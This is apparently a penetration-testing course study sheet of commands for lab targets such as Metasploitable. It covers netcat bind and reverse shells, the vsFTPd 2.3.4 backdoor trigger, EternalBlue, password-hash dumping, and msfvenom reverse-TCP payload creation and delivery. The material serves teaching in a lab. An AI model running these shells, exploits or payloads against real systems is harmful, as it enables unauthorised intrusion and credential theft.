# 03. Penetration Testing — Commands & Code Examples

### Inspect what holds a specific port with lsof
**What:** List the process/socket that has a given TCP port open during local recon (L03 p.13).
```bash
sudo lsof -i :8080
```
**Notes:** `lsof -i :<port>` shows files/sockets for that port; full information needs administrative privileges, hence `sudo` (L03 p.13). Use it to map a port back to its owning process before/while attacking.

### Show active TCP connections with netstat
**What:** Display network status and active TCP connections plus the owning programs (L03 p.13).
```bash
netstat -antp
```
**Notes:** `-a` all sockets, `-n` numeric (no DNS), `-t` TCP, `-p` show PID/program. Needs admin rights to reveal the program for every connection (L03 p.13).

### Show sockets with the modern ss tool
**What:** The modern equivalent of netstat for listing active TCP sockets (L03 p.13).
```bash
ss -at4n
```
**Notes:** `-a` all, `-t` TCP, `-4` IPv4 only, `-n` numeric. Faster replacement for `netstat`; same recon goal of enumerating open services (L03 p.13).

### Query DNS with nslookup
**What:** Quick name-to-IP lookup during the "gathering information" recon step (L03 p.14).
```bash
nslookup www.google.com
```
**Notes:** Returns the resolver's answer for the name. One of the four DNS tools the lecture lists to map names to IPs (L03 p.14).

### Resolve names and dump all records with host
**What:** Resolve a hostname, or pull every record type for a domain (L03 p.14).
```bash
host www.google.com
host -a gmail.com
```
**Notes:** `host -a` requests all record types (A, MX, NS, TXT, etc.) for the domain — useful for discovering mail/name-server infrastructure (L03 p.14).

### Trace DNS resolution from the root with dig
**What:** Walk the hierarchical DNS resolution from the root servers downward (L03 p.14).
```bash
dig +trace www.google.com
```
**Notes:** `+trace` shows each delegation step (root → TLD → authoritative) instead of just the final cached answer your resolver gives — that is what it adds over `nslookup` (L03 p.14, p.16).

### Open a basic netcat listener
**What:** Start a TCP listener with netcat, the network "Swiss-army knife" (L03 p.15).
```bash
nc -lvnp <port>
```
**Notes:** `-l` listen, `-v` verbose, `-n` no DNS resolution, `-p` port. Connect to it from another host with `nc <ip> <port>`. This is the primitive behind both shells and file transfer (L03 p.15).

### Set up a netcat bind shell (victim listens)
**What:** Victim serves a shell on a listening port; the attacker connects in (L03 p.16).
```bash
# On the VICTIM (e.g. Metasploitable 2):
nc -lvnp <port> -e /bin/bash

# On the ATTACKER (Kali):
nc <victim_ip> <port>
# then, once connected:
whoami
id
```
**Notes:** `-e /bin/bash` makes the listening side serve a shell — DANGEROUS: anyone who reaches the port can run commands on that host, use in the lab only (L03 p.16). The `-e` flag lives on whichever side serves the shell.

### Set up a netcat reverse shell (victim connects out)
**What:** Victim connects out to the attacker's empty listener and serves the shell (L03 p.17).
```bash
# On the ATTACKER (Kali) — empty listener:
nc -lvnp <port>

# On the VICTIM — connect back and serve the shell:
nc <attacker_ip> <port> -e /bin/bash

# Back on the attacker's listener:
whoami
id
```
**Notes:** Listener starts empty; `-e /bin/bash` goes on the victim side here. Reverse shells are preferred because the victim's outbound connection punches through inbound firewalls/NAT (L03 p.17, p.434 of guide gotchas).

### Transfer a file over netcat
**What:** Stream a file between two hosts using netcat redirection (L03 p.18).
```bash
# Receiver listens and writes to a file:
nc -lvnp <port> > file_content_received

# Sender connects and feeds the file in:
nc <ip> <port> < file_to_send
```
**Notes:** Redirection direction sets who sends: `<` feeds a file IN (sender), `>` writes a file OUT (receiver). Mixing them transfers nothing or overwrites the wrong file. This exact pattern moves `payload.elf` in the lab (L03 p.18; E03 p.5).

### Launch and navigate the Metasploit console
**What:** Start msfconsole and learn the basic console controls (L03 p.22).
```text
msfconsole
help
exit
```
**Notes:** `msfconsole` opens the framework console; `help` lists all commands and descriptions; `exit` then Enter leaves it (L03 p.22).

### Search for a Metasploit module
**What:** Find a module by keyword inside msfconsole (L03 p.23).
```text
search appletv
search eternalblue
search vnc protocol 3.3
```
**Notes:** Built-in alternative to browsing https://www.rapid7.com/db/?type=metasploit. Search by product/keyword; results are numbered for the next `use` step (L03 p.23, p.29, p.33).

### Select, inspect, and configure a module
**What:** The core msfconsole workflow: use → info → show options → set (L03 p.24-26).
```text
use <number>
use exploit/windows/smb/ms17_010_eternalblue
info
show options
set RHOSTS <target_ip>
set LHOST <attacker_ip>
```
**Notes:** `use <number>` selects from search results, or `use <MODULE PATH>` directly. RHOST/RHOSTS + RPORT = the target (remote); LHOST + LPORT = the attacker (local). Swapping R and L is the classic Metasploit mistake (L03 p.24-26).

### Run an auxiliary FTP version scanner
**What:** Fingerprint the FTP service to confirm the running version before exploiting (L03 p.27, p.31).
```text
use auxiliary/scanner/ftp/ftp_version
set RHOSTS <target_ip>
run
```
**Notes:** Auxiliary modules are run with `run`. Use this to confirm vsFTPd 2.3.4 on Metasploitable 2 before firing the backdoor exploit (L03 p.27, p.31).

### Run other auxiliary service scanners
**What:** Fingerprint common services with Metasploit auxiliary scanners (L03 p.27).
```text
use scanner/smb/smb_version
use auxiliary/scanner/mssql/mssql_ping
use scanner/ssh/ssh_version
use auxiliary/scanner/ftp/anonymous
use auxiliary/scanner/vnc/vnc_login
use auxiliary/scanner/http/http_version
```
**Notes:** Each gives more info about a target: SMB version, SQL Server presence, SSH version, anonymous FTP, VNC login, HTTP version. Set `RHOSTS` then `run` for each. Fingerprint first because exploits are vulnerability-specific (L03 p.27-28).

### Scan VNC then log in with the discovered password
**What:** Use the VNC login scanner, then enter the target with vncviewer (L03 p.29-30).
```text
search vnc protocol 3.3
use auxiliary/scanner/vnc/vnc_login
show options
set RHOSTS <target_ip>
run
```
```bash
# From Kali, using the password the scanner revealed:
vncviewer <target_ip>
```
**Notes:** The scanner reveals the VNC login password; `vncviewer <target_ip>` from Kali then logs in with it, putting you inside the target's desktop (L03 p.29-30).

### Exploit the vsFTPd 2.3.4 backdoor
**What:** Trigger the hard-coded backdoor in the malicious vsFTPd 2.3.4 build on Metasploitable 2 (L03 p.28, p.31).
```text
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <target_ip>
exploit
```
**Notes:** Triggers via FTP (port 21) but the resulting root bind shell listens on **port 6200**, not 21 — that is the "why?" the slide asks (L03 p.31). Classified as a backdoored service / hard-coded bind shell (E03 p.2).

### Reproduce the vsFTPd backdoor with only Nmap and Netcat
**What:** Demystify the vsFTPd 2.3.4 backdoor without Metasploit (L03 p.32).
```bash
# 1. Trigger the backdoor: send a username ending in :) on port 21
nc <target_ip> 21
USER backdoored:)
PASS anything

# 2. Confirm the hidden shell is now listening on 6200
nmap -p 6200 <target_ip>

# 3. Connect to the root shell on 6200
nc <target_ip> 6200
id
```
**Notes:** (standard syntax) The lecture shows reproducing the attack with only Nmap + Netcat to understand the backdoor concept; the trigger is a username containing the `:)` smiley, after which a root shell opens on TCP 6200 (L03 p.32; E03 p.2).

### Exploit EternalBlue (MS17-010) on Windows
**What:** Fire the SMB remote kernel-corruption exploit against Metasploitable 3 (Windows) (L03 p.28, p.33).
```text
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target_ip>
set LHOST <attacker_ip>
exploit
```
**Notes:** On success you land in a **Meterpreter session** (L03 p.33). RHOSTS = the Windows target, LHOST = your Kali box. This is the lab's required "network-based RCE (e.g. SMB)" for M3 (E03 p.3).

### Use other named course exploit modules
**What:** Additional target-specific exploit modules the slides list (L03 p.28).
```text
# Windows:
use exploit/windows/browser/ms11_003_ie_css_import
use exploit/windows/fileformat/ms15_100_mc1_exe
# Linux:
use exploit/multi/http/php_cgi_arg_injection
use exploit/linux/local/sock_sendpage
```
**Notes:** `php_cgi_arg_injection` = Apache/PHP-CGI argument injection RCE; `sock_sendpage` = local Linux kernel privilege-escalation flaw; `ms11_003` = IE CSS import bug; `ms15_100` = file-format exploit. An exploit only works if the target has that exact vulnerability (L03 p.28).

### Run Windows post-exploitation gather modules
**What:** After a session on Windows, gather host intelligence with post modules (L03 p.34).
```text
run post/windows/gather/enum_logged_on_users
run post/windows/gather/checkvm
run post/windows/gather/enum_applications
```
**Notes:** Retrieves logged-on users, whether the host is a VM, and installed applications respectively. Post modules run only after access is gained (L03 p.21, p.34).

### Run Linux post-exploitation gather modules
**What:** After a session on Linux, enumerate protections, hashes, and network (L03 p.34).
```text
run post/linux/gather/enum_protections
run post/linux/gather/hashdump
run post/linux/gather/enum_network
```
**Notes:** `enum_protections` detects IDS/sniffers; `hashdump` dumps password hashes; `enum_network` gathers network info. Slide has typos "linus"/"enum_network" — use `linux` and `enum_network` (L03 p.34, guide p.188).

### Verify a Meterpreter session
**What:** Confirm user context, OS, and a working session right after landing (L03 p.33; E03 p.6).
```text
sysinfo
getuid
getsystem
hashdump
```
**Notes:** `sysinfo` = OS/host details, `getuid` = current user context, `getsystem` (standard syntax) attempts privilege escalation to SYSTEM, `hashdump` extracts password hashes. Use `sysinfo` + `getuid` first to prove the session (E03 p.6).

### Generate a basic MSFvenom payload
**What:** See MSFvenom usage, list payloads, and build a simple Windows reverse-TCP EXE (L03 p.37).
```bash
msfvenom
msfvenom -l payloads
msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST=172.30.1.20 LPORT=4444
```
**Notes:** Running `msfvenom` alone prints all options; `-l payloads` lists every payload. General form: `msfvenom -p <PayloadPath> -f <FormatType> LHOST=<host> LPORT=<port>`. MSFvenom combines msfpayload + msfencode (L03 p.37).

### Generate a full MSFvenom Windows payload with all flags
**What:** Build a Windows reverse-TCP Meterpreter EXE specifying architecture, platform, and output file (L03 p.38).
```bash
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp -f exe LHOST=172.30.1.20 LPORT=4444 -o payload.exe
```
**Notes:** `-a x86` architecture (default x86), `--platform windows` OS, `-p` payload, `-f exe` output format (others: `elf`, `raw`, `pdf`, `avi`), `LHOST`/`LPORT` callback address, `-o` output file, `-e` (not shown) would add an encoder to evade AV/IDS (L03 p.38, p.21).

### Generate a Linux reverse-TCP ELF payload (lab)
**What:** Build the standalone Linux Meterpreter payload used in the lab's payload exercise (E03 p.4).
```bash
msfvenom \
  -a x86 --platform linux -f elf \
  -p linux/x86/meterpreter/reverse_tcp \
  lhost=<attacker ip> lport=<listening port> \
  -o payload.elf
```
**Notes:** `-f elf` is the Linux executable format (vs `exe` for Windows). Note the Windows variant swaps to `--platform windows -f exe -p windows/meterpreter/reverse_tcp -o payload.exe` (E03 p.4).

### Set up the multi/handler listener to catch a payload
**What:** Configure Metasploit's generic listener to receive a standalone reverse payload (E03 p.5).
```text
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
show options
set LHOST <attacker_ip>
set LPORT <listening port>
run
```
**Notes:** The handler's payload type, LHOST and LPORT MUST exactly match the values baked into the MSFvenom payload at generation time, or no session forms. After `run`/`exploit` it waits for the incoming connection (E03 p.5).

### Deliver and execute an ELF payload, then catch the session
**What:** Simulate payload delivery with netcat, make it executable, and run it (E03 p.5-6).
```bash
# On the TARGET (Metasploitable 2) — receive the file (write OUT with '>'):
nc -lvnp 4444 > payload.elf

# On the SENDER (Kali) — push the file (feed IN with '<'):
nc <target_ip> 4444 < payload.elf

# On the TARGET — make executable and run:
chmod a+x payload.elf
./payload.elf
```
**Notes:** Lab fakes delivery with netcat because social-engineering delivery is out of scope (E03 p.6). `chmod a+x` is mandatory or the ELF will not run. When it executes, the waiting multi/handler catches the Meterpreter session — verify with `sysinfo`/`getuid` (E03 p.5-6).

### Find exploits offline with searchsploit
**What:** Search the local Exploit-DB copy for a known exploit by keyword (L03 p.19).
```bash
searchsploit vsftpd 2.3.4
searchsploit eternalblue smb
```
**Notes:** (standard syntax) `searchsploit` is the offline CLI front-end to exploit-db.com. Be careful: not all online exploits do only what they claim — some do more and can damage the target, so read the code before running it (L03 p.19).

### Gather lab evidence after exploitation
**What:** Capture the proof-of-access evidence the lab requires per successful exploit (E03 p.3).
```bash
whoami
ip a
id
```
**Notes:** Required evidence per success: initial-access proof (`whoami`, `ip a`), privilege level (`id` on Linux / `getuid` in Meterpreter), a session screenshot, the module used, and an attack-path explanation (E03 p.3).
